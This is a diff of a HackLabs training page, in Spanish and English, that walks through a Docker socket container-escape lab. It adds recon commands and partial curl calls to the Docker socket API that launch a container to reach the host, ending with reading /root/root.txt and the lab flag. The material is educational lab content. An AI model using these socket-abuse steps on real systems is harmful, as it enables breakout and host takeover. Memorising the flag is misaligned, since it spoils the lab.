@@ -11,76 +11,40 @@
   {% endwith %}
 
   <div class="hl-card mb-4">
-    <h2 class="font-semibold text-sm mb-4" data-i18n="container_recon">Container Recon</h2>
+    <h2 class="font-semibold text-sm mb-3">Descripcion del lab</h2>
+    <p class="text-sm text-gray-300 mb-4">Este laboratorio usa un escenario Docker-in-Docker aislado. El objetivo es entrar en la victima, abusar del socket Docker compartido y obtener la flag real del lab dentro del host del escenario ad-hoc.</p>
+    <pre># 1) Levanta el entorno ad-hoc aislado (desde la carpeta del proyecto):
+docker compose -f docker-compose.docker-escape.yml up -d --build
+
+# 2) Entra al contenedor victima del lab:
+docker exec -it hacklabs-escape-victim sh</pre>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-4" data-i18n="container_recon">Reconocimiento del contenedor victima</h2>
 
     <div class="grid grid-cols-1 gap-2 sm:grid-cols-2">
-      <!-- in_container -->
-      <div class="flex items-center justify-between rounded-lg px-3 py-2.5"
-           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
-        <span class="text-xs font-mono text-gray-300" data-i18n="container_check_in">Running in container</span>
-        {% if checks and checks.in_container %}
-        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(239,68,68,.15);color:#f87171">DETECTED</span>
-        {% else %}
-        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(34,197,94,.12);color:#4ade80">SAFE</span>
-        {% endif %}
+      <div class="rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <div class="text-xs text-gray-400 mb-1">1. Confirmar contenedor</div>
+        <code class="text-xs font-mono break-all block overflow-x-auto" style="color:var(--hl-primary)">ls /.dockerenv &amp;&amp; echo "DENTRO del contenedor"</code>
       </div>
-
-      <!-- docker_socket -->
-      <div class="flex items-center justify-between rounded-lg px-3 py-2.5"
-           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
-        <span class="text-xs font-mono text-gray-300" data-i18n="container_check_socket">/var/run/docker.sock</span>
-        {% if checks and checks.docker_socket %}
-        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(239,68,68,.15);color:#f87171">EXPOSED</span>
-        {% else %}
-        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(34,197,94,.12);color:#4ade80">ABSENT</span>
-        {% endif %}
+      <div class="rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <div class="text-xs text-gray-400 mb-1">2. Confirmar socket Docker</div>
+        <code class="text-xs font-mono break-all block overflow-x-auto" style="color:var(--hl-primary)">ls -la /var/run/docker.sock</code>
       </div>
-
-      <!-- running_as_root -->
-      <div class="flex items-center justify-between rounded-lg px-3 py-2.5"
-           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
-        <span class="text-xs font-mono text-gray-300" data-i18n="container_check_root">Running as root</span>
-        {% if checks and checks.running_as_root %}
-        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(239,68,68,.15);color:#f87171">YES</span>
-        {% else %}
-        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(34,197,94,.12);color:#4ade80">NO</span>
-        {% endif %}
+      <div class="rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <div class="text-xs text-gray-400 mb-1">3. Confirmar daemon</div>
+        <code class="text-xs font-mono break-all block overflow-x-auto" style="color:var(--hl-primary)">curl --unix-socket /var/run/docker.sock http://localhost/_ping</code>
+        <div class="text-xs mt-2" style="color:#4ade80">Respuesta esperada: OK</div>
       </div>
-
-      <!-- privileged -->
-      <div class="flex items-center justify-between rounded-lg px-3 py-2.5"
-           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
-        <span class="text-xs font-mono text-gray-300" data-i18n="container_check_priv">Privileged mode</span>
-        {% if checks and checks.privileged %}
-        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(239,68,68,.15);color:#f87171">YES</span>
-        {% else %}
-        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(34,197,94,.12);color:#4ade80">NO</span>
-        {% endif %}
+      <div class="rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <div class="text-xs text-gray-400 mb-1">4. Confirmar CLI</div>
+        <code class="text-xs font-mono break-all block overflow-x-auto" style="color:var(--hl-primary)">which docker</code>
       </div>
-
-      <!-- writable_host_path -->
-      <div class="flex items-center justify-between rounded-lg px-3 py-2.5"
-           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
-        <span class="text-xs font-mono text-gray-300" data-i18n="container_check_hostpath">Writable host path mounted</span>
-        {% if checks and checks.writable_host_path %}
-        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(239,68,68,.15);color:#f87171">YES</span>
-        {% else %}
-        <span class="text-xs px-2 py-0.5 rounded font-mono font-semibold" style="background:rgba(34,197,94,.12);color:#4ade80">NO</span>
-        {% endif %}
-      </div>
-
-      <!-- id_output -->
-      <div class="rounded-lg px-3 py-2.5 sm:col-span-2"
-           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
-        <div class="text-xs text-gray-400 mb-1" data-i18n="container_check_id">id output</div>
-        <code class="text-xs font-mono break-all block overflow-x-auto" style="color:var(--hl-primary)">{{ checks.id_output if checks else 'uid=0(root) gid=0(root) groups=0(root)' }}</code>
-      </div>
-
-      <!-- cap_eff -->
-      <div class="rounded-lg px-3 py-2.5 sm:col-span-2"
-           style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
-        <div class="text-xs text-gray-400 mb-1" data-i18n="container_check_cap">CapEff (effective capabilities)</div>
-        <code class="text-xs font-mono break-all block overflow-x-auto" style="color:var(--hl-primary)">{{ checks.cap_eff if checks else '0000003fffffffff' }}</code>
+      <div class="rounded-lg px-3 py-2.5 sm:col-span-2" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">
+        <div class="text-xs text-gray-400 mb-1">Resultado esperado tras el escape</div>
+        <code class="text-xs font-mono break-all block overflow-x-auto" style="color:var(--hl-primary)">cat /root/root.txt  # HL{c0n741n3r_35c4p3_h057_4cc355}</code>
+        <p class="text-xs text-gray-400 mt-2">El host accesible aqui es el del escenario ad-hoc aislado, no el sistema operativo principal que ejecuta HackLabs.</p>
       </div>
     </div>
   </div>
@@ -94,14 +58,7 @@
   docker compose -f docker-compose.docker-escape.yml up -d --build
 
   # 2) Entra al contenedor víctima del lab:
-  docker exec -it hacklabs-escape-victim sh
-
-  # 3) Verificaciones dentro de la víctima:
-  ls /.dockerenv &amp;&amp; echo "DENTRO del contenedor" || echo "no detectado"
-  ls -la /var/run/docker.sock
-  curl --unix-socket /var/run/docker.sock http://localhost/_ping
-
-  # Debe responder: OK</pre>
+  docker exec -it hacklabs-escape-victim sh</pre>
 
     <h3>Easy — Docker Socket Escape</h3>
     <p>El socket de Docker está montado dentro del contenedor. Cualquier proceso con acceso al socket puede lanzar contenedores privilegiados en el host.</p>
@@ -113,9 +70,10 @@ ls /.dockerenv &amp;&amp; echo "DENTRO del contenedor" || echo "no detectado"
 # Alternativa (solo cgroupsv1 — en kernels &gt;=6.x puede devolver vacío):
 cat /proc/1/cgroup | grep -i docker</pre>
       </li>
-      <li>Verifica que el socket existe y está accesible:
+      <li>Verifica que el socket existe y que el daemon responde:
         <pre>ls -la /var/run/docker.sock
-# srw-rw---- ... docker → socket disponible</pre>
+    curl --unix-socket /var/run/docker.sock http://localhost/_ping
+    # Socket presente + respuesta OK → daemon accesible</pre>
       </li>
       <li>Comprueba si el binario docker está disponible:
         <pre>which docker
@@ -141,7 +99,7 @@ curl --unix-socket /var/run/docker.sock -X POST \
 curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
 curl --unix-socket /var/run/docker.sock http://localhost/containers/escape/logs?stdout=1</pre>
       </li>
-      <li>Desde dentro del chroot tienes acceso completo al host. Lee la flag:
+      <li>Desde dentro del chroot tienes acceso completo al host del escenario aislado. Lee la flag del lab:
         <pre>cat /root/root.txt</pre>
       </li>
     </ol>
@@ -201,14 +159,7 @@ cat /output</pre>
   docker compose -f docker-compose.docker-escape.yml up -d --build
 
   # 2) Enter the victim container:
-  docker exec -it hacklabs-escape-victim sh
-
-  # 3) Verify from inside victim:
-  ls /.dockerenv &amp;&amp; echo "INSIDE container" || echo "not detected"
-  ls -la /var/run/docker.sock
-  curl --unix-socket /var/run/docker.sock http://localhost/_ping
-
-  # Expected response: OK</pre>
+  docker exec -it hacklabs-escape-victim sh</pre>
 
     <h3>Easy — Docker Socket Escape</h3>
     <p>The Docker socket is mounted inside the container. Any process with socket access can launch privileged containers on the host.</p>
@@ -220,9 +171,10 @@ ls /.dockerenv &amp;&amp; echo "INSIDE container" || echo "not detected"
 # Alternative (cgroupsv1 only — on kernels &gt;=6.x may return empty):
 cat /proc/1/cgroup | grep -i docker</pre>
       </li>
-      <li>Verify the socket exists and is accessible:
+      <li>Verify the socket exists and the daemon responds:
         <pre>ls -la /var/run/docker.sock
-# srw-rw---- ... docker → socket available</pre>
+    curl --unix-socket /var/run/docker.sock http://localhost/_ping
+    # Socket present + OK response → daemon reachable</pre>
       </li>
       <li>Check if the docker binary is available:
         <pre>which docker
@@ -248,7 +200,7 @@ curl --unix-socket /var/run/docker.sock -X POST \
 curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
 curl --unix-socket /var/run/docker.sock http://localhost/containers/escape/logs?stdout=1</pre>
       </li>
-      <li>Inside the chroot you have full host access. Read the flag:
+      <li>Inside the chroot you have full access to the isolated scenario host. Read the lab flag:
         <pre>cat /root/root.txt</pre>
       </li>
     </ol>
